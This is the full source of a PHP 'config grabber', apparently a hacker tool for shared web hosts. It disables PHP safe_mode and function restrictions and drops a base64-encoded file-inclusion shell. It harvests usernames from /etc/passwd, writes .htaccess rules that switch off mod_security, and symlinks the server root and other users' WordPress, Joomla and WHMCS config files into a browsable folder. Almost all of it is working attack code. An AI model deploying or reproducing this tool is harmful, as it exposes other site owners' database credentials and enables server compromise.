<title>Configs Grabber By Nine Millon 9</title>
<p align="center"> 
<img border="0" src="https://pngimage.net/wp-content/uploads/2018/05/dragon-png-image-2.png" height="450" width="650"></p>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<iframe width="0px" height="0px" src="https://e.top4top.io/m_14883befg1.mp3]https://e.top4top.io/m_14883befg1.mp3" allow="autoplay; encrypted-media" allowfullscreen></iframe></span><br><br><br><center></head>

<?php 

echo'
<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >
<td width="100%" align=center valign="top" rowspan="1">
<center><font color="#6699ff" size="7" face="impact">Configs Grabber By Nine Millon 9</center></font>
<div class="hedr"> 
<td height="10" align="left" class="td1"></td></tr><tr><td 
width="100%" align="center" valign="top" rowspan="1"><font 
color="red" face="comic sans ms"size="1"><b> 
</table>'; 

?>
<center>
<form method=post><font color=white size=3 face="comic sans ms">Get Usernames For Symlink</font><p>
<input type=submit name="usre" value="Extract Usernames" /></form>

<?php

$r=fopen('php.ini','w');
$rr="safe_mode = OFF
Safe_mode_gid = OFF
disable_functions = NONE
disable_classes = NONE";
fwrite($r,$rr);
?>
<?php
$shellololol = 'PD8NCmVjaG8gaW5pX2dldCjigJxzYWZlX21vZGXigJ0pOw0KZWNobyBpbmlfZ2V0KOKAnG9wZW5fYmFzZWRpcuKAnSk7DQppbmNsdWRlKCRfR0VUWyJmaWxlIl0pOw0KaW5pX3Jlc3RvcmUo4oCcc2FmZV9tb2Rl4oCdKTsNCmluaV9yZXN0b3JlKOKAnG9wZW5fYmFzZWRpcuKAnSk7DQplY2hvIGluaV9nZXQo4oCcc2FmZV9tb2Rl4oCdKTsNCmVjaG8gaW5pX2dldCjigJxvcGVuX2Jhc2VkaXLigJ0pOw0KaW5jbHVkZSgkX0dFVFsic3MiXSk7DQo/Pg==';
$zerer = fopen("ini.php" ,"w+");
$write = fwrite ($zerer ,base64_decode($shellololol));
fclose($zerer);
?>

<?php
if(isset($_POST['usre'])){
?><form method=post>
<textarea rows=10 cols=50 name=user><?php  $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}

?></textarea><br><br>
<input type=submit name=su value="Extract Them Now" /></form>
<?php } ?>
<?php
error_reporting(0);
echo "<font color=red size=3 face=\"comic sans ms\">";
if(isset($_POST['su']))
{
mkdir('ac',0777);
$rr  = "OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI \nOptions Indexes FollowSymLinks \nForceType text/plain \nAddType text/plain .php \nAddType text/plain .html \nAddType text/html .shtml \nAddType txt .php \nAddHandler server-parsed .php \nAddHandler server-parsed .shtml \nAddHandler txt .php \nAddHandler txt .html \nAddHandler txt .shtml \nOptions All \nOptions All \n<IfModule mod_security.c> \nSecFilterEngine Off \nSecFilterScanPOST Off \nSecFilterCheckURLEncoding Off \nSecFilterCheckCookieFormat Off \nSecFilterCheckUnicodeEncoding Off \nSecFilterNormalizeCookies Off \n</IfModule>";
$g = fopen('ac/.htaccess','w');
fwrite($g,$rr);
$Sym = symlink("/","ac/root");
$rt="<a href=ac/root><font color=red size=5 face=\"impact\">Root</font></a>";
echo "<br><u>$rt</u>";

$dir=mkdir('ac',0777);
$r  = "OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI \nOptions Indexes FollowSymLinks \nForceType text/plain \nAddType text/plain .php \nAddType text/plain .html \nAddType text/html .shtml \nAddType txt .php \nAddHandler server-parsed .php \nAddHandler server-parsed .shtml \nAddHandler txt .php \nAddHandler txt .html \nAddHandler txt .shtml \nOptions All \nOptions All \n<IfModule mod_security.c> \nSecFilterEngine Off \nSecFilterScanPOST Off \nSecFilterCheckURLEncoding Off \nSecFilterCheckCookieFormat Off \nSecFilterCheckUnicodeEncoding Off \nSecFilterNormalizeCookies Off \n</IfModule>";
$f = fopen('ac/.htaccess','w');
   
fwrite($f,$r);
$acsym="<a href=ac/><font color=red size=5 face=\"impact\">Configuration Files</font></a>";
echo "<br><br><u><font color=red size=3 face=\"comic sans ms\">$acsym</font></u>";

$usr=explode("\n",$_POST['user']);
$configuration=array("wp-config.php","wordpress/wp-config.php","configuration.php","blog/wp-config.php","joomla/configuration.php","vb/includes/config.php","includes/config.php","conf_global.php","inc/config.php","config.php","Settings.php","sites/default/settings.php","whm/configuration.php","whmcs/configuration.php","support/configuration.php","whmc/WHM/configuration.php","whm/WHMCS/configuration.php","whm/whmcs/configuration.php","support/configuration.php","clients/configuration.php","client/configuration.php","clientes/configuration.php","cliente/configuration.php","clientsupport/configuration.php","billing/configuration.php","admin/config.php");
foreach($usr as $uss )
{
$us=trim($uss);

foreach($configuration as $c)
{
$rs="/home/".$us."/public_html/".$c;
$r="ac/".$us." .. ".$c;
symlink($rs,$r);
}
}
}
?>
</center>